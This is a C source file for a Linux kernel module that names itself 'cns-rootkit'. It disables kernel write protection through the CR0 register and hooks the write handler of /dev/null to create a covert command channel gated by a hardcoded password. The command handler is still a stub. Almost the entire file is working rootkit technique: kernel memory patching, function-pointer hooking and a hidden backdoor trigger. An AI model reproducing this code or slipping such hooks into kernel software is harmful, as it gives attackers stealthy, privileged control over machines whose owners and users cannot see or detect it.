#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/string.h>

#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

MODULE_LICENSE("MIT");
MODULE_AUTHOR("SAV");

#define PASSWORD "HohoHaha"
#define CMD1 "cmd1"

struct hook {
  void *original_function;
  void *modified_function;
  void **modified_at;
  struct list_head list;
};

LIST_HEAD(hook_list);

void hook_add(void **modified_at, void *modified_function) {
  struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);
  if(!h) {
    return ;
  }

  h->modified_at = modified_at;
  h->modified_function = modified_function;
  h->original_function = (void *) (*modified_at);
  list_add(&h->list, &hook_list);
}

void hook_patch(void *modified_function) {
  struct hook *h;

  list_for_each_entry(h, &hook_list, list) {
    if(h->modified_function == modified_function) {
      DISABLE_W_PROTECTED_MEMORY
      *(h->modified_at) = h->modified_function;
      ENABLE_W_PROTECTED_MEMORY
      break;
    }
  }
}

void *hook_unpatch(void *modified_function) {
  struct hook *h;

  list_for_each_entry(h, &hook_list, list) {
    if(h->modified_function == modified_function) {
      DISABLE_W_PROTECTED_MEMORY
      *(h->modified_at) = h->original_function;
      ENABLE_W_PROTECTED_MEMORY
      return h->original_function;
    }
  }

  return NULL;
}

void hook_remove(void *modified_function) {
  struct hook *h, *tmp;

  list_for_each_entry_safe(h, tmp, &hook_list, list) {
    if(h->modified_function == modified_function) {
      hook_unpatch(modified_function);
      list_del(&h->list);
      kfree(h);
    }
  }
}

struct file_operations *get_fops(char *path) {
  struct file *filep;
  if((filep = filp_open(path, O_RDONLY, 0)) == NULL) {
    return NULL;
  }
  struct file_operations *fop;
  fop = (struct file_operations *) filep->f_op;
  filp_close(filep, 0);

  return fop;
}

void command_execute(char __user *buf, size_t count) {
  if(count <= sizeof(PASSWORD)) {
    printk(KERN_INFO "cns-rootkit: Command is too small %lu\n", sizeof(PASSWORD));
    return;
  } 
  
  if(strncmp(buf, PASSWORD, sizeof(PASSWORD) - 1) != 0) { 
    printk(KERN_INFO "cns-rootkit: Password failed %d\n", strncmp(buf, PASSWORD, sizeof(PASSWORD)));
    return;
  }

  printk(KERN_INFO "cns-rootkit: command password passed\n");

  buf += (sizeof(PASSWORD) - 1);

  if(strncmp(buf, CMD1, sizeof(CMD1) - 1) == 0) {
    printk(KERN_INFO "cns-rootkit: got command1\n");
    // call some function here
  } else {
    printk(KERN_INFO "cns-rootkit: got unknown command\n");
  }
}

ssize_t cns_rootkit_dev_null_write(struct file *filep, char __user *buf, size_t count, loff_t *p) {
  printk(KERN_INFO "cns-rootkit: In my /dev/null hook with length %lu\n", count);
  command_execute(buf, count);
  ssize_t (*original_dev_null_write) (struct file *filep, char __user *buf, size_t count, loff_t *p);
  original_dev_null_write = hook_unpatch((void *) cns_rootkit_dev_null_write);
  ssize_t res =  original_dev_null_write(filep, buf, count, p);
  hook_patch((void *) cns_rootkit_dev_null_write);

  return res;
}

int establish_comm_channel(void) {
  printk(KERN_INFO "cns-rootkit: Attempting to establish communication channel\n");
  struct file_operations *dev_null_fop = get_fops("/dev/null");

  hook_add((void **)(&(dev_null_fop->write)), (void *)cns_rootkit_dev_null_write);
  hook_patch((void *) cns_rootkit_dev_null_write);

  printk(KERN_INFO "cns-rootkit: Successfully established communication channel\n");
  return 0;
}

int unestablish_comm_channel(void) {
  printk(KERN_INFO "cns-rootkit: Attempting to unestablish communication channel\n");

  hook_remove((void *) cns_rootkit_dev_null_write);

  printk(KERN_INFO "cns-rootkit: Successfully unestablished communication channel\n");
  return 0;
}

static int cns_rootkit_init(void) {
  printk(KERN_INFO "cns-rootkit: Init\n");

  if(establish_comm_channel() < 0) {
    printk(KERN_INFO "cns-rootkit: Failed to establish communication channel\n");
  }
  return 0;
}

static void cns_rootkit_exit(void) {
  unestablish_comm_channel();
  printk(KERN_INFO "cns-rootkit: Exit\n");

}

module_init(cns_rootkit_init);
module_exit(cns_rootkit_exit);
